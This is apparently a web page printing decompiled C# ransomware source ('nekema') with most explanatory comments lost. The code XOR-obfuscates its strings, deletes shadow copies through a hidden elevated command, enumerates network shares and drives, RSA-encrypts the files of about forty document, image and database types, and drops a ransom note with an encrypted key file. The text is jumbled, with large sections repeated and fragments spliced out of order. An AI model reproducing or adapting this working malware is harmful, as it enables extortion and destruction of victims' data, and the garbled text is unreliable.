0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> , 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 